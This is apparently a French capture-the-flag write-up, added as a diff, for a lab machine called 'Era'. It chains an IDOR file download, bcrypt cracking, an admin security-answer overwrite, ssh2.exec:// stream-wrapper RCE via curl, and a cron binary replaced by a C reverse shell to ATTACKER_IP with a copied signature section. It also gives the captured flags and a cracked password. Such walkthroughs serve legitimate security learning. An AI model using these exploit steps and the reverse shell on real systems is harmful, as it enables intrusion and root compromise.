@@ -1,0 +1,187 @@
+---
+title: Era
+description: WU Era
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 13
+  badge:
+    text: 'medium'
+    variant: caution
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:orange">**MEDIUM**</span> | 10.129.23.164 |
+
+## Flags
+
+| Flag | Emplacement |
+|------|-------------|
+| User | `/home/eric/user.txt` |
+| Root | `/root/root.txt` |
+
+## Résumé
+
+1. **Reconnaissance** : Découverte de `file.era.htb` via énumération de vhosts, FTP et HTTP exposés
+2. **IDOR** : `download.php` sans vérification d'appartenance → récupération du backup source + `filedb.sqlite`
+3. **Crack de hash** : Hash bcrypt d'`eric` cracké → `eric:america`
+4. **Prise de contrôle admin** : IDOR logique sur `reset.php` → réécriture des réponses de sécurité du compte admin
+5. **RCE** : Injection de stream wrapper `ssh2.exec://` via le paramètre `format` de `download.php`
+6. **Privilege Escalation** : Binaire `monitor` writable par le groupe `devs`, exécuté par root via cron → backdoor avec bypass de la vérification `.text_sig`
+
+---
+
+## Reconnaissance
+
+### Configuration initiale
+
+```bash
+export TARGET=10.129.23.164
+echo "$TARGET era.htb file.era.htb" >> /etc/hosts
+```
+
+### Scan Nmap
+
+```bash
+nmap -p- $TARGET -sV -sC -oN nmap_full.txt
+```
+
+**Résultats :**
+- Port 21/TCP : FTP vsftpd 3.0.58
+- Port 80/TCP : Nginx 1.18.0 (Ubuntu) → redirige vers `http://era.htb/`
+
+L'énumération de vhosts révèle `file.era.htb`, une plateforme de partage de fichiers PHP.
+
+---
+
+## IDOR - Récupération du backup et de la base SQLite
+
+Après inscription sur `file.era.htb`, le endpoint `download.php` accepte n'importe quel identifiant numérique sans vérifier que le fichier appartient à l'utilisateur courant.
+
+```bash
+curl -b cookies.txt "http://file.era.htb/download.php?id=54&dl=true" -o site-backup.zip
+curl -b cookies.txt "http://file.era.htb/download.php?id=150&dl=true" -o signing.zip
+```
+
+**Fichiers récupérés :**
+- Code source PHP complet (`login.php`, `reset.php`, `security_login.php`, `download.php`)
+- `filedb.sqlite` contenant les noms d'utilisateurs et les hashes bcrypt
+
+---
+
+## Crack du hash bcrypt
+
+Extraction des hashes depuis la base SQLite :
+
+```bash
+sqlite3 filedb.sqlite "SELECT username, password FROM users;"
+```
+
+```
+admin_ef01cab31aa: $2y$10$wDbohsUa...
+eric:              $2y$10$S9EOSDqF...
+```
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+**Résultat** : `eric:america`
+
+---
+
+## Prise de contrôle du compte admin via IDOR logique
+
+L'analyse de `reset.php` révèle qu'un utilisateur authentifié peut modifier les réponses aux questions de sécurité de **n'importe quel** compte sans vérification d'appartenance.
+
+**Étapes :**
+1. Se connecter avec `eric:america`
+2. Écraser les réponses de sécurité du compte `admin_ef01cab31aa`
+3. Passer la vérification `security_login.php` → `$_SESSION['erauser'] = 1` activé
+
+---
+
+## Remote Code Execution - Stream wrapper `ssh2.exec://`
+
+### Analyse de `download.php` (mode admin)
+
+Le paramètre `format` est passé directement à `fopen()`. Lorsqu'il contient `://`, PHP l'interprète comme un stream wrapper.
+
+L'extension `ssh2.so` expose la syntaxe `ssh2.exec://user:pass@host/commande`.
+
+### Exploitation
+
+Le fragment `#` permet de tronquer le chemin de fichier ajouté après la commande par l'application :
+
+```bash
+curl -b admin_cookies.txt \
+  "http://file.era.htb/download.php?format=ssh2.exec://eric:america@127.0.0.1/id%20#&file=files/site-backup-30-08-24.zip"
+```
+
+En remplaçant `id` par un reverse shell encodé, on obtient un shell en tant qu'`eric`.
+
+**Flag user** : `8a7d2954e15bfe8ab44b811e8a0478db`
+
+---
+
+## Privilege Escalation - Backdoor du binaire `monitor`
+
+### Analyse de la situation
+
+```bash
+ls -la /opt/AV/periodic-checks/
+```
+
+```
+-rwxrw----  root:devs   monitor
+-rw-rw----  root:devs   status.log
+```
+
+Le binaire `monitor` est exécuté périodiquement par root via cron et le groupe `devs` peut y écrire. Il vérifie son intégrité via une section ELF personnalisée `.text_sig`.
+
+### Compilation d'un binaire malveillant
+
+Sur la cible, compiler un reverse shell C minimal :
+
+```c
+#include <stdlib.h>
+int main() {
+    system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
+    return 0;
+}
+```
+
+```bash
+gcc -o /tmp/monitor_bad shell.c
+```
+
+### Extraction et injection de la signature
+
+```bash
+objcopy --dump-section .text_sig=/tmp/sig /opt/AV/periodic-checks/monitor
+objcopy --add-section .text_sig=/tmp/sig /tmp/monitor_bad /tmp/monitor_signed
+```
+
+### Remplacement du binaire original
+
+```bash
+rm -f /opt/AV/periodic-checks/monitor
+cp /tmp/monitor_signed /opt/AV/periodic-checks/monitor
+```
+
+Le `rm` préalable évite l'erreur "Text file busy". À la prochaine exécution cron, le binaire est lancé en tant que root.
+
+**Flag root** : `8b40a1e481a480f55d3b065b84fdfc23`
+
+---
+
+## Synthèse des vulnérabilités
+
+| # | Vulnérabilité | Impact |
+|---|---------------|--------|
+| 1 | IDOR sur `download.php` | Lecture arbitraire de fichiers |
+| 2 | IDOR logique sur `reset.php` | Prise de contrôle du compte admin |
+| 3 | Injection de stream wrapper via `fopen()` + `ssh2.exec://` | RCE en tant qu'`eric` |
+| 4 | Binaire root writable + bypass trivial `.text_sig` | Élévation de privilèges vers root |
